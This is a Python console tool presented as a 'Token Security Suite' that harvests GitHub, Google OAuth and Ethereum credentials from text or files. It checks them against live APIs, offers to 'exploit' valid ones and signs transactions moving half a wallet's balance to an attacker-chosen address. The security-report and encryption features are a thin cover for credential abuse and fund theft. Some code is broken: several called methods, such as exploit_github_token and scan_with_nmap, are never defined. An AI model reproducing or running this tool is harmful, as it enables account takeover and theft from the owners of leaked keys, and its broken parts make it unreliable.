import requests
import json
import os
import datetime
import re
import sys
import time
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from web3 import Web3
import hashlib
import base64
from cryptography.fernet import Fernet

class ConsoleUI:
    @staticmethod
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')

    @staticmethod
    def print_banner():
        banner = """
     ______     __                _____  __________
    /_  __/__  / /_____ ___  ____/  _/ |/ / __/ __ \\
     / / / _ \\/  '_/ -_) _ \\/___// //    / _// /_/ /
    /_/  \\___/_/\\_\\\\__/_//_/   /___/_/|_/_/  \\____/
        """
        print(f"\033[92m{banner}\033[0m")
        print(f"\033[92m{'='*60}\033[0m")
        print(f"\033[92mTOKEN SECURITY SUITE v5.0\033[0m")
        print(f"\033[92mGitHub | Google | Web3 | Blockchain\033[0m")
        print(f"\033[92m{'='*60}\033[0m\n")

    @staticmethod
    def loading_animation(message, duration=1):
        chars = "|/-\\"
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            sys.stdout.write(f"\r\033[92m{chars[i % len(chars)]} {message}\033[0m")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        sys.stdout.write(f"\r\033[92m✓ {message}\033[0m\n")

    @staticmethod
    def progress_bar(current, total, prefix='Progress:', length=40):
        percent = current / total
        filled = int(length * percent)
        bar = f"\033[92m{'█' * filled}\033[0m\033[92m{'░' * (length - filled)}\033[0m"
        sys.stdout.write(f"\r{prefix} |{bar}| {percent:.1%}")
        sys.stdout.flush()
        if current == total:
            sys.stdout.write('\n')

    @staticmethod
    def print_success(text):
        print(f"\033[92m✓ {text}\033[0m")

    @staticmethod
    def print_error(text):
        print(f"\033[91m✗ {text}\033[0m")

    @staticmethod
    def print_warning(text):
        print(f"\033[93m⚠ {text}\033[0m")

    @staticmethod
    def print_info(text):
        print(f"\033[96mℹ {text}\033[0m")

    @staticmethod
    def print_header(text):
        print(f"\n\033[92m{text}\033[0m")
        print(f"\033[92m{'-'*40}\033[0m")

class TokenExploiter:
    def __init__(self):
        self.results = []
        self.github_token_pattern = r'ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{82}|gho_[a-zA-Z0-9]{36}|ghu_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}'
        self.google_access_token_pattern = r'ya29\.[a-zA-Z0-9_-]{100,200}|1/[0-9A-Za-z_-]{100,200}'
        self.google_api_key_pattern = r'AIza[0-9A-Za-z_-]{35}'
        self.google_client_secret_pattern = r'GOCSPX[-A-Za-z0-9_]+'
        self.web3_pattern = r'0x[a-fA-F0-9]{40}|[a-fA-F0-9]{64}'

    def check_github_token(self, token):
        headers = {'Authorization': f'token {token}', 'User-Agent': 'Token-Security-Scanner'}
        try:
            response = requests.get('https://api.github.com/user', headers=headers, timeout=10)
            if response.status_code == 200:
                user_data = response.json()
                scopes = response.headers.get('X-OAuth-Scopes', 'No scopes')
                repos_response = requests.get('https://api.github.com/user/repos', headers=headers, timeout=10)
                repos = repos_response.json() if repos_response.status_code == 200 else []
                return {
                    'valid': True,
                    'source': 'GitHub',
                    'username': user_data.get('login', 'Unknown'),
                    'email': user_data.get('email', 'Not public'),
                    'scopes': scopes,
                    'repos_count': len(repos) if isinstance(repos, list) else 0,
                    'risk_level': 'CRITICAL'
                }
            elif response.status_code == 401:
                return {'valid': False, 'source': 'GitHub', 'reason': 'Invalid or revoked token'}
            else:
                return {'valid': False, 'source': 'GitHub', 'reason': f'HTTP {response.status_code}'}
        except Exception as e:
            return {'valid': False, 'source': 'GitHub', 'reason': str(e)}

    def check_google_client_secret(self, token):
        try:
            if not token.startswith('GOCSPX'):
                return {'valid': False, 'source': 'Google', 'reason': 'Not a client secret'}

            return {
                'valid': True,
                'source': 'Google OAuth Client Secret',
                'token_type': 'CLIENT_SECRET',
                'risk_level': 'CRITICAL',
                'info': 'This is an OAuth 2.0 Client Secret used to authenticate application',
                'usage': 'Can be used with client_id to generate access tokens',
                'exploit_possible': True
            }
        except Exception as e:
            return {'valid': False, 'source': 'Google', 'reason': str(e)}

    def check_google_access_token(self, token):
        try:
            if token.startswith('ya29.'):
                headers = {'Authorization': f'OAuth {token}', 'User-Agent': 'Token-Security-Scanner'}
                response = requests.get('https://www.googleapis.com/oauth2/v1/tokeninfo', headers=headers, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    return {
                        'valid': True,
                        'source': 'Google OAuth Access Token',
                        'user_id': data.get('user_id', 'Unknown'),
                        'email': data.get('email', 'Unknown'),
                        'scopes': data.get('scope', 'Unknown'),
                        'expires_in': data.get('expires_in', 0),
                        'risk_level': 'CRITICAL'
                    }
            return {'valid': False, 'source': 'Google', 'reason': 'Invalid access token'}
        except Exception as e:
            return {'valid': False, 'source': 'Google', 'reason': str(e)}

    def check_google_api_key(self, token):
        try:
            response = requests.get(f'https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={token}', timeout=10)
            if response.status_code == 200:
                data = response.json()
                return {
                    'valid': True,
                    'source': 'Google API Key',
                    'user_id': data.get('user_id', 'Unknown'),
                    'scopes': data.get('scope', 'Unknown'),
                    'risk_level': 'HIGH'
                }
            return {'valid': False, 'source': 'Google', 'reason': 'Invalid API key'}
        except Exception as e:
            return {'valid': False, 'source': 'Google', 'reason': str(e)}

    def exploit_client_secret(self, client_secret, client_id=None):
        if not client_id:
            return {'error': 'Client ID required', 'suggestion': 'Try: 123456789012-abcdefghijklmnopqrstuvwxyz.apps.googleusercontent.com'}

        try:
            token_url = 'https://oauth2.googleapis.com/token'
            data = {
                'client_id': client_id,
                'client_secret': client_secret,
                'grant_type': 'client_credentials'
            }
            response = requests.post(token_url, data=data, timeout=10)
            if response.status_code == 200:
                return {
                    'success': True,
                    'access_token': response.json().get('access_token'),
                    'expires_in': response.json().get('expires_in')
                }
            else:
                return {'success': False, 'error': response.text}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def check_web3_token(self, private_key):
        try:
            if private_key.startswith('0x'):
                private_key = private_key[2:]

            if len(private_key) != 64:
                return {'valid': False, 'source': 'Web3', 'reason': 'Invalid key length'}

            w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/demo'))
            account = w3.eth.account.from_key('0x' + private_key)
            balance = w3.eth.get_balance(account.address)

            return {
                'valid': True,
                'source': 'Ethereum',
                'address': account.address,
                'balance_eth': w3.from_wei(balance, 'ether'),
                'balance_wei': balance,
                'risk_level': 'CRITICAL' if balance > 0 else 'HIGH'
            }
        except Exception as e:
            return {'valid': False, 'source': 'Web3', 'reason': str(e)}

    def exploit_web3_token(self, private_key, target_address=None):
        try:
            if private_key.startswith('0x'):
                private_key = private_key[2:]

            w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/demo'))
            account = w3.eth.account.from_key('0x' + private_key)
            balance = w3.eth.get_balance(account.address)

            results = {
                'address': account.address,
                'balance': w3.from_wei(balance, 'ether'),
                'transactions': []
            }

            if target_address and balance > 0:
                tx = {
                    'nonce': w3.eth.get_transaction_count(account.address),
                    'to': target_address,
                    'value': balance // 2,
                    'gas': 21000,
                    'gasPrice': w3.eth.gas_price
                }
                signed_tx = w3.eth.account.sign_transaction(tx, '0x' + private_key)
                results['signed_transaction'] = signed_tx.rawTransaction.hex()

            return results
        except Exception as e:
            return {'error': str(e)}

    def encrypt_token(self, token, key=None):
        if not key:
            key = Fernet.generate_key()
        f = Fernet(key)
        encrypted = f.encrypt(token.encode())
        return encrypted, key

    def decrypt_token(self, encrypted_token, key):
        f = Fernet(key)
        decrypted = f.decrypt(encrypted_token)
        return decrypted.decode()

    def hash_token(self, token, algorithm='sha256'):
        if algorithm == 'sha256':
            return hashlib.sha256(token.encode()).hexdigest()
        elif algorithm == 'sha512':
            return hashlib.sha512(token.encode()).hexdigest()
        elif algorithm == 'md5':
            return hashlib.md5(token.encode()).hexdigest()

class TokenSecurityScanner:
    def __init__(self):
        self.scanner = TokenExploiter()
        self.ui = ConsoleUI()
        self.scan_results = []

    def extract_tokens_from_text(self, text):
        tokens = []

        github_tokens = re.findall(self.scanner.github_token_pattern, text)
        for token in github_tokens:
            tokens.append({'token': token, 'type': 'github'})

        google_client_tokens = re.findall(self.scanner.google_client_secret_pattern, text)
        for token in google_client_tokens:
            tokens.append({'token': token, 'type': 'google_client_secret'})

        google_access_tokens = re.findall(self.scanner.google_access_token_pattern, text)
        for token in google_access_tokens:
            tokens.append({'token': token, 'type': 'google_access_token'})

        google_api_tokens = re.findall(self.scanner.google_api_key_pattern, text)
        for token in google_api_tokens:
            tokens.append({'token': token, 'type': 'google_api_key'})

        web3_tokens = re.findall(self.scanner.web3_pattern, text)
        for token in web3_tokens:
            if len(token) == 40 or len(token) == 64:
                tokens.append({'token': token, 'type': 'web3'})

        if not tokens and text.strip():
            if text.strip().startswith('GOCSPX'):
                tokens.append({'token': text.strip(), 'type': 'google_client_secret'})
            elif text.strip().startswith('ghp_'):
                tokens.append({'token': text.strip(), 'type': 'github'})
            elif text.strip().startswith('ya29.'):
                tokens.append({'token': text.strip(), 'type': 'google_access_token'})
            elif text.strip().startswith('AIza'):
                tokens.append({'token': text.strip(), 'type': 'google_api_key'})
            elif len(text.strip()) == 64 or (text.strip().startswith('0x') and len(text.strip()) == 66):
                tokens.append({'token': text.strip(), 'type': 'web3'})

        return tokens

    def scan_tokens(self, tokens):
        results = []
        total = len(tokens)

        for i, token_info in enumerate(tokens):
            self.ui.progress_bar(i + 1, total, prefix='Scanning tokens:')

            if token_info['type'] == 'github':
                result = self.scanner.check_github_token(token_info['token'])
            elif token_info['type'] == 'google_client_secret':
                result = self.scanner.check_google_client_secret(token_info['token'])
            elif token_info['type'] == 'google_access_token':
                result = self.scanner.check_google_access_token(token_info['token'])
            elif token_info['type'] == 'google_api_key':
                result = self.scanner.check_google_api_key(token_info['token'])
            elif token_info['type'] == 'web3':
                result = self.scanner.check_web3_token(token_info['token'])
            else:
                continue

            result['original_token'] = self.mask_token(token_info['token'])
            result['token_type'] = token_info['type']
            result['scan_time'] = datetime.datetime.now().isoformat()
            results.append(result)

        return results

    def mask_token(self, token):
        if len(token) > 20:
            return token[:10] + '...' + token[-10:]
        return token[:5] + '...' + token[-5:]

    def generate_security_report(self):
        report = {
            'scan_date': datetime.datetime.now().isoformat(),
            'total_tokens': len(self.scan_results),
            'valid_tokens': sum(1 for r in self.scan_results if r.get('valid', False)),
            'critical_tokens': sum(1 for r in self.scan_results if r.get('risk_level') == 'CRITICAL'),
            'high_risk_tokens': sum(1 for r in self.scan_results if r.get('risk_level') == 'HIGH'),
            'recommendations': []
        }

        for result in self.scan_results:
            if result.get('valid', False):
                if result.get('risk_level') == 'CRITICAL':
                    report['recommendations'].append(f"Immediately revoke {result['token_type'].upper()} token: {result['original_token']}")
                elif result.get('risk_level') == 'HIGH':
                    report['recommendations'].append(f"Review permissions for {result['token_type'].upper()} token: {result['original_token']}")

        return report

    def protect_token(self, token, password):
        salt = os.urandom(32)
        key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        f = Fernet(base64.urlsafe_b64encode(key))
        encrypted = f.encrypt(token.encode())
        return base64.b64encode(salt + encrypted).decode()

    def verify_protected_token(self, protected_token, password):
        data = base64.b64decode(protected_token)
        salt = data[:32]
        encrypted = data[32:]
        key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        f = Fernet(base64.urlsafe_b64encode(key))
        decrypted = f.decrypt(encrypted)
        return decrypted.decode()

def main():
    ui = ConsoleUI()
    scanner = TokenSecurityScanner()
    exploiter = TokenExploiter()

    while True:
        ui.clear()
        ui.print_banner()

        print("\033[92mMAIN MENU\033[0m")
        print("\033[92m1. SCAN & EXPLOIT TOKENS\033[0m")
        print("\033[92m2. TOKEN PROTECTION & ENCRYPTION\033[0m")
        print("\033[92m3. ADVANCED PENETRATION\033[0m")
        print("\033[92m4. SECURITY AUDIT & REPORT\033[0m")
        print("\033[92m5. WEB3 & BLOCKCHAIN INTEGRATION\033[0m")
        print("\033[92m6. EXIT\033[0m")

        choice = input(f"\n\033[92mSelect option: \033[0m").strip()

        if choice == '1':
            ui.print_header("TOKEN SCANNING & EXPLOITATION")

            print("\033[92mSelect input method:\033[0m")
            print("1. Manual token input")
            print("2. Scan file for tokens")
            print("3. Paste text")

            method = input(f"\n\033[92mChoice: \033[0m")

            tokens = []
            if method == '1':
                token_input = input(f"\033[92mEnter token: \033[0m")
                tokens = scanner.extract_tokens_from_text(token_input)
            elif method == '2':
                filepath = input(f"\033[92mFile path: \033[0m")
                if os.path.exists(filepath):
                    with open(filepath, 'r') as f:
                        content = f.read()
                    tokens = scanner.extract_tokens_from_text(content)
                else:
                    ui.print_error("File not found")
            elif method == '3':
                print("\033[92mPaste text (press Enter twice to finish):\033[0m")
                lines = []
                while True:
                    line = input()
                    if not line:
                        break
                    lines.append(line)
                text = ' '.join(lines)
                tokens = scanner.extract_tokens_from_text(text)

            if tokens:
                ui.loading_animation("Initializing scanner...", 1)
                scanner.scan_results = scanner.scan_tokens(tokens)

                for result in scanner.scan_results:
                    if result.get('valid', False):
                        ui.print_success(f"VALID {result['token_type'].upper()} - {result.get('risk_level', 'UNKNOWN')} RISK")
                        print(f"   Source: {result.get('source', 'Unknown')}")

                        if result['token_type'] == 'github':
                            print(f"   Username: {result.get('username', 'Unknown')}")
                            print(f"   Repos: {result.get('repos_count', 0)}")
                            exploit_choice = input(f"\n\033[92mExploit this token? (y/n): \033[0m")
                            if exploit_choice.lower() == 'y':
                                ui.loading_animation("Exploiting GitHub token...", 2)
                                exploit_results = exploiter.exploit_github_token(tokens[0]['token'], 'info')
                                if 'user' in exploit_results and exploit_results['user']:
                                    print(f"   User: {exploit_results['user'].get('login', 'Unknown')}")

                        if result['token_type'] == 'google_client_secret':
                            print(f"   Type: OAuth 2.0 Client Secret")
                            print(f"   Usage: Can generate access tokens with valid client_id")
                            print(f"   Full Token: {result['original_token']}")
                            exploit_choice = input(f"\n\033[92mTry to exploit with client_id? (y/n): \033[0m")
                            if exploit_choice.lower() == 'y':
                                client_id = input(f"\033[92mEnter client_id: \033[0m")
                                exploit_results = exploiter.exploit_client_secret(tokens[0]['token'], client_id)
                                if exploit_results.get('success'):
                                    ui.print_success(f"Access token obtained: {exploit_results['access_token'][:50]}...")
                                else:
                                    ui.print_error(f"Exploit failed: {exploit_results.get('error')}")

                        if result['token_type'] == 'google_access_token':
                            print(f"   User: {result.get('email', 'Unknown')}")
                            print(f"   Scopes: {result.get('scopes', 'Unknown')[:100]}")

                        if result['token_type'] == 'web3':
                            print(f"   Address: {result.get('address', 'Unknown')}")
                            print(f"   Balance: {result.get('balance_eth', 0)} ETH")

                            if result.get('balance_eth', 0) > 0:
                                transfer = input(f"\n\033[92mTransfer funds? (y/n): \033[0m")
                                if transfer.lower() == 'y':
                                    target = input(f"\033[92mTarget address: \033[0m")
                                    tx = exploiter.exploit_web3_token(tokens[0]['token'], target)
                                    if 'signed_transaction' in tx:
                                        ui.print_success("Transaction signed ready for broadcast")
                    else:
                        ui.print_error(f"INVALID {result['token_type'].upper()} - {result.get('reason', 'Unknown error')}")

                    print()

                export = input(f"\n\033[92mExport results to JSON? (y/n): \033[0m")
                if export.lower() == 'y':
                    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f'token_audit_{timestamp}.json'
                    with open(filename, 'w') as f:
                        json.dump(scanner.scan_results, f, indent=2)
                    ui.print_success(f"Exported to {filename}")
            else:
                ui.print_warning("No valid tokens found")
                retry = input(f"\n\033[92mTry again with same token? (y/n): \033[0m")
                if retry.lower() == 'y':
                    token_input = input(f"\033[92mEnter token: \033[0m")
                    tokens = scanner.extract_tokens_from_text(token_input)
                    if tokens:
                        continue

            input(f"\n\033[92mPress Enter to continue...\033[0m")

        elif choice == '2':
            ui.print_header("TOKEN PROTECTION SYSTEM")

            print("\033[92m1. Encrypt a token")
            print("2. Decrypt a token")
            print("3. Generate secure hash")
            print("4. Password-protect token")

            protect_choice = input(f"\n\033[92mChoice: \033[0m")

            if protect_choice == '1':
                token = input(f"\033[92mEnter token to encrypt: \033[0m")
                encrypted, key = exploiter.encrypt_token(token)
                ui.print_success(f"Encrypted token: {encrypted.decode()[:50]}...")
                print(f"\033[92mSave this key: {key.decode()}\033[0m")

                with open('encrypted_token.key', 'w') as f:
                    f.write(key.decode())
                with open('encrypted_token.dat', 'w') as f:
                    f.write(encrypted.decode())
                ui.print_success("Saved to encrypted_token.key and encrypted_token.dat")

            elif protect_choice == '2':
                key = input(f"\033[92mEnter encryption key: \033[0m")
                encrypted = input(f"\033[92mEnter encrypted token: \033[0m")
                try:
                    decrypted = exploiter.decrypt_token(encrypted.encode(), key.encode())
                    ui.print_success(f"Decrypted token: {decrypted}")
                except Exception as e:
                    ui.print_error(f"Decryption failed: {e}")

            elif protect_choice == '3':
                token = input(f"\033[92mEnter token to hash: \033[0m")
                print("1. SHA256\n2. SHA512\n3. MD5")
                algo = input(f"\033[92mAlgorithm: \033[0m")
                algo_map = {'1': 'sha256', '2': 'sha512', '3': 'md5'}
                hash_result = exploiter.hash_token(token, algo_map.get(algo, 'sha256'))
                ui.print_success(f"Hash: {hash_result}")

            elif protect_choice == '4':
                token = input(f"\033[92mEnter token to protect: \033[0m")
                password = input(f"\033[92mEnter password: \033[0m")
                protected = scanner.protect_token(token, password)
                ui.print_success(f"Protected token: {protected[:50]}...")

                with open('protected_token.dat', 'w') as f:
                    f.write(protected)
                ui.print_success("Saved to protected_token.dat")

            input(f"\n\033[92mPress Enter to continue...\033[0m")

        elif choice == '3':
            ui.print_header("ADVANCED PENETRATION")

            print("\033[93mWARNING: Use only on authorized systems\033[0m")
            print("\033[92m1. Subdomain enumeration (Sublist3r)")
            print("2. Port scanning (Nmap)")
            print("3. GitHub token brute force simulation")

            adv_choice = input(f"\n\033[92mChoice: \033[0m")

            if adv_choice == '1':
                domain = input(f"\033[92mEnter domain: \033[0m")
                ui.loading_animation(f"Enumerating subdomains for {domain}...", 3)
                subdomains = exploiter.scan_with_sublist3r(domain)
                if subdomains:
                    ui.print_success(f"Found {len(subdomains)} subdomains")
                    for sub in subdomains[:20]:
                        print(f"   {sub}")
                else:
                    ui.print_error("No subdomains found or Sublist3r not installed")

            elif adv_choice == '2':
                target = input(f"\033[92mEnter target IP: \033[0m")
                ui.loading_animation(f"Scanning {target}...", 5)
                result = exploiter.scan_with_nmap(target)
                if result and "Nmap not available" not in result:
                    print(result[:1000])
                else:
                    ui.print_error("Nmap not installed")

            input(f"\n\033[92mPress Enter to continue...\033[0m")

        elif choice == '4':
            ui.print_header("SECURITY AUDIT REPORT")

            if scanner.scan_results:
                report = scanner.generate_security_report()

                print(f"\033[92mSECURITY REPORT\033[0m")
                print(f"Date: {report['scan_date']}")
                print(f"Total Tokens Analyzed: {report['total_tokens']}")
                print(f"Valid Tokens: {report['valid_tokens']}")
                print(f"Critical Risk: {report['critical_tokens']}")
                print(f"High Risk: {report['high_risk_tokens']}")

                if report['recommendations']:
                    print(f"\n\033[93mRECOMMENDATIONS:\033[0m")
                    for rec in report['recommendations']:
                        print(f"   {rec}")

                timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f'security_report_{timestamp}.json'
                with open(filename, 'w') as f:
                    json.dump(report, f, indent=2)
                ui.print_success(f"Report saved to {filename}")
            else:
                ui.print_warning("No scan data available. Run a scan first.")

            input(f"\n\033[92mPress Enter to continue...\033[0m")

        elif choice == '5':
            ui.print_header("WEB3 & BLOCKCHAIN INTEGRATION")

            print("\033[92m1. Check ETH private key")
            print("2. Generate new ETH wallet")
            print("3. Check token on blockchain")

            web3_choice = input(f"\n\033[92mChoice: \033[0m")

            if web3_choice == '1':
                pk = input(f"\033[92mEnter private key (0x...): \033[0m")
                ui.loading_animation("Checking blockchain...", 2)
                result = exploiter.check_web3_token(pk)
                if result.get('valid'):
                    ui.print_success("Valid ETH wallet found")
                    print(f"   Address: {result['address']}")
                    print(f"   Balance: {result['balance_eth']} ETH")
                else:
                    ui.print_error(f"Invalid key: {result.get('reason')}")

            elif web3_choice == '2':
                w3 = Web3()
                account = w3.eth.account.create()
                ui.print_success("New wallet generated")
                print(f"   Address: {account.address}")
                print(f"   Private Key: {account.key.hex()}")

                with open('new_wallet.txt', 'w') as f:
                    f.write(f"Address: {account.address}\nPrivate Key: {account.key.hex()}")
                ui.print_success("Saved to new_wallet.txt")

            input(f"\n\033[92mPress Enter to continue...\033[0m")

        elif choice == '6':
            ui.print_success("Exiting Token Security Suite...")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[92mExited by user\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\033[91mFatal error: {e}\033[0m")
        sys.exit(1)
